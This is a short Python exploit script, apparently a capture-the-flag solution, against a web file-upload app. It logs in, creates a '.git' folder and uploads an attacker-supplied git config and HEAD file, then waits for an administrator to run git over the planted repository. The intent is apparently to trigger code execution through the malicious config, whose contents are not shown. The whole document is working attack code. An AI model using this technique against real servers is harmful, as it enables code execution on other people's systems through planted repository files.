import requests, sys
from base64 import b64encode
S = requests.Session()
url = sys.argv[1]
evil_config = b64encode(open("evil_config","rb").read()).decode()
evil_head = b64encode(open("HEAD","rb").read()).decode()
rand_folder = S.post(url+"/login",json={"username":"Worty"}).json()["data"].split(": ")[1].strip("\n")
S.post(url+f"/{rand_folder}/new",json={"folder":".git"}) #creating evil git folder
S.post(url+"/upload",json={"file":evil_config,"filename":".git/config"})
S.post(url+"/upload",json={"file":evil_head,"filename":".git/HEAD"})
S.post(url+f"/{rand_folder}/new",json={"folder":".git/objects"})
S.post(url+f"/{rand_folder}/new",json={"folder":".git/refs"})
print("wait for the evil admin to check your files !!")